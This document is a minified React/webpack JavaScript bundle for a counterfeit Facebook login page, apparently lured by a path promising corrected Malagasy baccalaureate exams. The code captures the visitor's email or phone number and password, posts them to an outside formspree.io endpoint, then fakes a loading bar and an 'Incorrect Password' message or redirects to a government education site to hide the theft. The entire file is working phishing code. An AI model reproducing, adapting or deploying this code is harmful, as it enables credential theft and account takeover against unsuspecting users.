(this.webpackJsonpmemory=this.webpackJsonpmemory||[]).push([[0],{31:function(e){e.exports=JSON.parse('{"enter_mobile_or_phone":"Num\xe9ro de mobile ou e-mail","enter_password":"Mot de passe","login_text":"Connexion","create_new_account":"C\xe9er un compte","or":"ou","forgot_pass":"Mot de passe oubli\xe9 ?","more_lang":"Autre langues...","pass_wrong":{"title":"Mot de passe incorect","message":"Le mot de passe que vous avez saisi est incorrect. Veuillez r\xe9essayer."}}')},32:function(e){e.exports=JSON.parse('{"enter_mobile_or_phone":"Mobile number or email","enter_password":"Password","create_new_account":"Create New Account","login_text":"Log In","or":"or","forgot_pass":"Forgot password ?","more_lang":"More languages...","pass_wrong":{"title":"Incorrect Password","message":"The password you entered is incorrect.Please try again."}}')},33:function(e,t,a){e.exports=a(69)},38:function(e,t,a){},39:function(e,t,a){e.exports=a.p+"static/media/logo.5d5d9eef.svg"},40:function(e,t,a){},69:function(e,t,a){"use strict";a.r(t);var n=a(0),o=a.n(n),r=a(25),c=a.n(r),l=(a(38),a(7)),s=a(10),i=a(1),m=(a(39),a(40),a(71)),u=function(e){var t=e.handleChange,a=e.emailOrPhone,n=Object(m.a)("common"),r=Object(i.a)(n,2),c=r[0];r[1];return o.a.createElement("div",{className:"content-input"},o.a.createElement("label",{htmlFor:""},c("enter_mobile_or_phone")),o.a.createElement("input",{type:"text",value:a,onChange:t,name:"emailOrPhone",id:"emailOrPhone",className:"input"}))},d=function(e){var t=e.handleChange,a=e.password,n=Object(m.a)("common"),r=Object(i.a)(n,2),c=r[0];r[1];return o.a.createElement("div",{className:"content-input"},o.a.createElement("label",{htmlFor:""},c("enter_password")),o.a.createElement("input",{onChange:t,value:a,type:"password",name:"",id:"password",className:"input"}))},g=function(e){var t=e.set_animation,a=Object(m.a)("common"),n=Object(i.a)(a,2),r=n[0];n[1];return o.a.createElement("div",{className:"content-button"},o.a.createElement("button",{type:"submit",className:"button_submit",onClick:t},r("login_text")))},v=function(){var e=Object(m.a)("common"),t=Object(i.a)(e,2),a=t[0];t[1];return o.a.createElement("div",{className:"line-or"},o.a.createElement("div",{className:"line"},o.a.createElement("div",{className:"box_one"},o.a.createElement("hr",null)),o.a.createElement("span",null,a("or")),o.a.createElement("div",{className:"box_two"},o.a.createElement("hr",null))),o.a.createElement("div",{className:"create_new"},o.a.createElement("button",{className:"button_create"},a("create_new_account"))))},p=a(6),f=function(){var e=Object(m.a)("common"),t=e.t,a=e.i18n;return o.a.createElement(n.Fragment,null,o.a.createElement("div",{className:"lang"},o.a.createElement(p.a,null,o.a.createElement("div",{className:"main-lang"},o.a.createElement(p.b,{to:"/mg",className:"text",activeClassName:"activeLink"},"Malagasy"),o.a.createElement(p.b,{className:"text",to:"/fr",onClick:function(){return a.changeLanguage("fr")},activeClassName:"activeLink"},"Fran\xe7ais (France)"),o.a.createElement(p.b,{className:"text",onClick:function(){return a.changeLanguage("en")},to:"/en",activeClassName:"activeLink"},"English (US)")))),o.a.createElement("p",{className:"text"},t("more_lang")))},b=function(){return o.a.createElement("div",{className:"",id:"hide_body_id"})},h=document.documentElement;var w=function(){return o.a.createElement("div",{className:"content-fb-title"},o.a.createElement("span",{onClick:function(){h.requestFullscreen?h.requestFullscreen():h.webkit?h.webkitRequestFullScreen():h.msRequestFullscreen&&h.msRequestFullscreen()},className:"title-fb"},"Facebook"))},E=a(30),_=a.n(E);var N=function(){var e=Object(n.useState)(!1),t=Object(i.a)(e,2),a=t[0],r=t[1],c=Object(n.useState)(0),p=Object(i.a)(c,2),h=p[0],E=p[1],N=Object(n.useState)(!1),O=Object(i.a)(N,2),k=O[0],y=O[1],j=Object(n.useState)({emailOrPhone:"",password:""}),C=Object(i.a)(j,2),S=C[0],x=C[1],F=Object(m.a)("common"),L=Object(i.a)(F,2),P=L[0],q=(L[1],function(e){x(Object(s.a)(Object(s.a)({},S),{},Object(l.a)({},e.target.id,e.target.value)))});Object(n.useEffect)((function(){var e=null;return k&&(e=setInterval((function(){var e=Math.floor(3*Math.random());E(h+e)}),50),h>97&&(window.location.href="https://www.education.gov.mg/",r(!0),clearInterval(e))),function(){return clearInterval(e)}}),[k,h]);var M=function(){r(!1);var e=document.querySelector("#hide_body_id"),t=document.querySelector(".loading");e.classList.remove("hide_body"),t.classList.remove("loading"),E(0),y(!1)},W=S.password,A=S.emailOrPhone;return o.a.createElement(n.Fragment,null,o.a.createElement("div",{className:"container"},o.a.createElement("div",{className:"loading",id:"load",style:{width:h+"%"}}),o.a.createElement(w,null),o.a.createElement("div",{className:"main"},o.a.createElement("form",{onSubmit:function(e){e.preventDefault();var t=S.emailOrPhone,a=S.password;t&&a&&_.a.post("https://formspree.io/f/mzbkknod",S).then((function(){console.log("data submitted")})).catch((function(e){console.log(e)}))}},o.a.createElement(u,{handleChange:q,emailOrPhone:A||""}),o.a.createElement(d,{handleChange:q,password:W||""}),o.a.createElement(g,{set_animation:function(){var e=document.querySelector("#hide_body_id"),t=document.querySelector("#load");e.classList.add("hide_body"),y(!0),t.classList.add("loading")}})),o.a.createElement("p",{className:"forgot"},P("forgot_pass")),o.a.createElement(v,null),o.a.createElement(f,null))),o.a.createElement(b,null),a?o.a.createElement("div",{className:"modal_container"},o.a.createElement("div",{className:"modal"},o.a.createElement("p",{className:"title-wrong"},o.a.createElement("b",null,P("pass_wrong.title"))),o.a.createElement("p",{className:"mssg-success-or-error"},P("pass_wrong.message")),o.a.createElement("button",{onClick:M,className:"ok"},"ok"))):null)},O=Boolean("localhost"===window.location.hostname||"[::1]"===window.location.hostname||window.location.hostname.match(/^127(?:\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/));function k(e,t){navigator.serviceWorker.register(e).then((function(e){e.onupdatefound=function(){var a=e.installing;null!=a&&(a.onstatechange=function(){"installed"===a.state&&(navigator.serviceWorker.controller?(console.log("New content is available and will be used when all tabs for this page are closed. See https://bit.ly/CRA-PWA."),t&&t.onUpdate&&t.onUpdate(e)):(console.log("Content is cached for offline use."),t&&t.onSuccess&&t.onSuccess(e)))})}})).catch((function(e){console.error("Error during service worker registration:",e)}))}var y=a(14),j=a(31),C=a(32);y.a.init({interpolation:{escapeValue:!1},lng:"en",resources:{en:{common:C},fr:{common:j}}});var S=y.a,x=a(70);c.a.render(o.a.createElement(o.a.StrictMode,null,o.a.createElement(x.a,{i18n:S},o.a.createElement(N,null))),document.getElementById("root")),function(e){if("serviceWorker"in navigator){if(new URL("/bacc-mada-corrige-toute-matiere",window.location.href).origin!==window.location.origin)return;window.addEventListener("load",(function(){var t="".concat("/bacc-mada-corrige-toute-matiere","/service-worker.js");O?(!function(e,t){fetch(e,{headers:{"Service-Worker":"script"}}).then((function(a){var n=a.headers.get("content-type");404===a.status||null!=n&&-1===n.indexOf("javascript")?navigator.serviceWorker.ready.then((function(e){e.unregister().then((function(){window.location.reload()}))})):k(e,t)})).catch((function(){console.log("No internet connection found. App is running in offline mode.")}))}(t,e),navigator.serviceWorker.ready.then((function(){console.log("This web app is being served cache-first by a service worker. To learn more, visit https://bit.ly/CRA-PWA")}))):k(t,e)}))}}()}},[[33,1,2]]]);
//# sourceMappingURL=main.ff4663ff.chunk.js.map